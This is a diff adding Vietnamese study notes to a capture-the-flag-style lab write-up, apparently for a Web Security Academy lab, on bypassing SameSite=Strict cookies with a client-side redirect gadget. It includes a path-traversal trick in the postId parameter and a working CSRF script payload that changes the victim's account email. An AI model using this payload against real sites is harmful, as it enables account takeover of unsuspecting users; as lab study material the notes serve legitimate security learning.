@@ -365,6 +365,85 @@ Bypass:
 
 Lab des: 
 
+Trang web mục tiêu sử dụng cookie session với thuộc tính `SameSite=Strict`, ngăn cookie được gửi trong các cross-site requests. Tuy nhiên, có thể bypass được cơ chế này bằng cách sử dụng redirect phía client (JavaScript).
+
+Trang web chứa một chức năng thay đổi email mà không sử dụng CSRF token, vì vậy nếu vượt qua được cơ chế bảo vệ SameSite, có thể tấn công CSRF thành công.
+
+VD về SameSite strict:
+
+- Trình duyệt không gửi cookie khi `evil.com` gửi `POST` trực tiếp đến `vulnerable.com` vì `SameSite=Strict`.
+
+- Tuy nhiên, nếu trang của attacker chuẩn bị, chuyển hướng người dùng đến `vulnerable.com` thông qua một client-side redirect nào đó thì trình duyệt coi đó là một điều hướng thông thường giống như người dùng nhập URL → cookie sẽ được gửi kèm
+
+Khảo sát các điều kiện của bài lab:
+
+- request `POST /my-account/change-email`:
+
+![image-20250603092951809](./image/image-20250603092951809.png)
+
+=> request không chứa unpredictable tokens 
+
+- Response của request POST /login
+
+![image-20250603093315188](./image/image-20250603093315188.png)
+
+=> SameSite=Strict
+
 
 
 Steps: 
+
+- Tìm kiếm gadget phù hợp
+
+  Chức năng comment: 
+
+  ![image-20250603093605943](./image/image-20250603093605943.png)
+
+  Khi comment xong, user được chuyển đến 1 comfirmation page, và sau đó chuyển hướng ngay lại trang blog post ban đầu, sử dụng script: 
+
+  `/resources/js/commentConfirmationRedirect.js`
+
+  ![image-20250603094045634](./image/image-20250603094045634.png)
+
+Gửi thử một request comment với postId=n33r9
+
+![image-20250603094229489](./image/image-20250603094229489.png)
+
+Server đang cố gắng redirect về trang ''/post/n33r9'
+
+![image-20250603094237095](./image/image-20250603094237095.png)
+
+=> nhưng không tìm thấy trang
+
+=> craft payload path traversal, để redirect về trang `my-account`: `/post/comment/confirmation?postId=1/../../my-account`
+
+=> redirect thành công về trang my-account => có thể dùng tham số postId param để gửi request GET đến điểm bất kì của target site.
+
+- <script>     document.location = "https://0a35009a04ad453f808603a400b80013.web-security-academy.net/post/comment/confirmation?postId=../my-account"; </script>
+
+=> sau khi ng dùng bấm vào link payload, sẽ được redirect về trang login.
+
+![image-20250603121304529](./image/image-20250603121304529.png)
+
+=> tức là, kể cả khi request submit comment được gửi từ một trang bất kì, thì trình duyệt vẫn bao gồm cả thông tin cookie của người dùng comment
+
+thêm nữa, khi thử gửi req GET thay đổi email, trình duyệt vẫn cho phép người dùng thay đổi email thành công.
+
+- craft payload: 
+
+```
+<script>
+    document.location = "https://0a35009a04ad453f808603a400b80013.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+```
+
+![image-20250603122142511](./image/image-20250603122142511.png)
+
+
+
+
+
+### [Lab 8: SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
+
+Lab des: 
+
